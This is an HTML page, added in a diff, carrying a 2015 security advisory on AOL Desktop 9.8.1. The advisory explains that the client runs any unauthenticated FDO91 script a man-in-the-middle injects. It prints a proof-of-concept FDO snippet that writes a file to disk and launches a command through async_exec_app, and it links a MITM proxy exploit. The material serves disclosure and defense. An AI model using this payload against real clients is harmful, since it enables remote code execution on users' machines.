@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Security Advisory: AOL Desktop MiTM Remote File Write and Code Execution</title>
+  <meta name="description" content="By slipstream/RoL.">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="/2015/12/05/aol-desktop.html">
+  <link rel="alternate" type="application/rss+xml" title="LizardHQ research" href="/feed.xml" />
+
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  <link href='https://fonts.googleapis.com/css?family=PT+Sans:400,700' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300,700' rel='stylesheet' type='text/css'>
+</head>
+
+
+  <body>
+
+    <div class="site-header">
+
+  <div class="logo">
+    <a href="/"><img src="/img/logo.png"></a>
+  </div>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <i class="fa fa-navicon fa-lg"></i>
+      </a>
+
+      <div class="trigger">
+          <a class="page-link" href="/">Home</a>
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+      </div>
+    </nav>
+
+
+</div>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="post">
+
+  <header class="post-header">
+     <h1 class="post-title">Security Advisory: AOL Desktop MiTM Remote File Write and Code Execution</h1>
+     <p class="post-meta">Posted on Dec 5, 2015</p>
+  </header>
+
+  <article class="post-content">
+    <p><em>By slipstream/RoL.</em></p>
+
+<h1>Overview</h1>
+
+<p>AOL Desktop is &quot;the all-in-one experience with mail, instant messaging, browsing, search, content, and dial-up connectivity&quot;. It is the direct successor of the old Windows AOL clients from the 1990s.</p>
+
+<p>Issues in AOL Desktop, version 9.8.1 and below, that have existed since 1993, can be exploited by an entity in a man-in-the-middle position to write files to disk and cause remote command execution.</p>
+
+<h1>Issues</h1>
+
+<p>The custom AOL protocol involves a scripting language known as FDO91 (FDO). Packets sent between client and server, and server and client, include FDO91 that is compiled into a bytecode.</p>
+
+<p>No authentication is done on any packets sent, and the client will execute any FDO it is sent by the server.</p>
+
+<p>Some FDO opcodes are interesting from an attacker&#39;s perspective. The <code>fm_*</code> series of opcodes (the File Management protocol, <code>0x08xx</code>), have existed since the very first version of AOL for Windows from 1993. This series of opcodes enables reading from and writing to disk.</p>
+
+<p>The <code>async_exec_app</code> opcode (<code>0x0d19</code>) takes a string operand, and executes the command in that string. This opcode has existed since version 2.0 of AOL for Windows, from 1994.</p>
+
+<p>The snippet of FDO that follows attempts to write <code>pwned.txt</code> to disk and execute <code>notepad.exe</code> with the path to <code>pwned.txt</code> as an argument:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">fm_start
+fm_item_type &lt;filename&gt;
+fm_item_set &lt;&quot;pwned.txt&quot;&gt;
+fm_item_type &lt;path&gt;
+cm_tb_get_path
+uni_use_last_atom_string &lt;fm_item_set&gt;
+fm_item_get &lt;filespec&gt;
+uni_use_last_atom_string &lt;var_string_set, 01x&gt;
+fm_create_file
+fm_open_file &lt;01x&gt;
+fm_append_data &lt;&quot;AOL pwned clientside through MITM...\r\nReading/writing to FS and arbitrary command execution 1993-2015 :)&quot;&gt;
+fm_flush_file
+fm_close_file
+fm_end
+var_string_set &lt;A,&quot;notepad.exe \&quot;&quot;&gt;
+var_string_concatenate_regs &lt;A,B&gt;
+var_string_set &lt;B,&quot;\&quot;&quot;&gt;
+var_string_concatenate_regs &lt;A,B&gt;
+var_string_get &lt;A&gt;
+uni_use_last_atom_string &lt;async_exec_app&gt;
+</code></pre></div>
+<p><a href="https://gist.github.com/Wack0/c1929ab5d29c83473bd4">A proof of concept is available</a> that creates a MITM proxy that modifies a specific packet to add the bytecode of the above FDO to the end of that packet&#39;s original FDO and update the length.</p>
+
+<h1>Affected Versions</h1>
+
+<p>9.8.1 and below. It is not known whether the betas of 9.8.2 are affected.</p>
+
+<h1>Solution</h1>
+
+<p>Uninstallation of this software will prevent exploitation of these issues. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.</p>
+
+  </article>
+
+  <div align="center">
+  	<a href="#">
+  	<i class="fa fa-arrow-circle-up fa-2x"></i>
+  	</a>
+  </div>
+
+</div>
+
+        <div class="footer" align="right">
+  <hr>
+  <a href="http://kopimi.com" target="_blank"><img src="/img/kopimi.gif"></a>
+  <a href="https://twitter.com/lizardhq" target="_blank">@lizardhq</a>
+</div>
+
+      </div>
+    </div>
+
+  </body>
+</html>
